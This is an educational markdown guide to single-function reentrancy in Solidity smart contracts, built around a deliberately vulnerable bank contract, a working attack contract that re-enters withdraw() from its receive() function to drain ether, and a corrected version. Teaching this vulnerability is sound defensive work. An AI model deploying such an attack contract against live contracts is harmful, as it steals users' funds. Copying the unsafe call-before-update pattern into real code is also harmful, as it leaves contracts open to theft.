# 1️⃣ Single-Function Reentrancy

## 📖 Description
The simplest and most common form of reentrancy where an attacker repeatedly calls the **same function** before its previous execution completes. This was the vulnerability exploited in the infamous DAO hack (2016) that resulted in $60 million stolen and led to Ethereum's hard fork.

## 🎯 Key Characteristics
- Same function is called recursively
- State updates happen **after** external calls
- Most detectable by security tools

## 💻 Vulnerable Contract Example

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABLE: State updated AFTER external call
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        
        // External call BEFORE state update (BAD!)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // State update happens too late
        balances[msg.sender] = 0;
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## 🔴 Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract SingleFunctionReentrancyAttack {
    IVulnerableBank public vulnerableBank;
    uint256 public attackCount;
    uint256 constant MAX_ATTACKS = 3;
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
    }
    
    // Step 1: Deposit funds to establish balance
    function depositToVictim() external payable {
        vulnerableBank.deposit{value: msg.value}();
    }
    
    // Step 2: Start the attack
    function attack() external {
        attackCount = 0;
        vulnerableBank.withdraw();
    }
    
    // Step 3: This gets called when victim sends ETH
    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(vulnerableBank).balance >= 1 ether) {
            attackCount++;
            vulnerableBank.withdraw(); // Reenter!
        }
    }
    
    function getStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

## ✅ Fixed Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureBank {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // FIXED: State updated BEFORE external call
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        
        // State update BEFORE external call (GOOD!)
        balances[msg.sender] = 0;
        
        // External call happens last
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
```
